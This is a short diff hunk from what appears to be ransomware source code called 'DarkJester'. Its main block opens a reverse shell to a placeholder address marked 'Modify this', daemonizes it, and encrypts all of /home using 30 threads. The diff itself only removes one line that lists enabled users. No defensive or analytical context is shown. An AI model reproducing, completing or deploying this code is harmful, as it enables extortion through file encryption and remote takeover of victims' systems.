@@ -168,7 +168,6 @@ if __name__ == "__main__":
     jester = DarkJester()
     shell = ReverseShell('127.0.0.1', 1234) # Modify this
     shell.daemonize()
-    enabled_users = jester.get_enabled_users()
     user_directory = "/home"
     if os.path.exists(user_directory):
         jester.encrypt_directory(user_directory, max_threads=30)
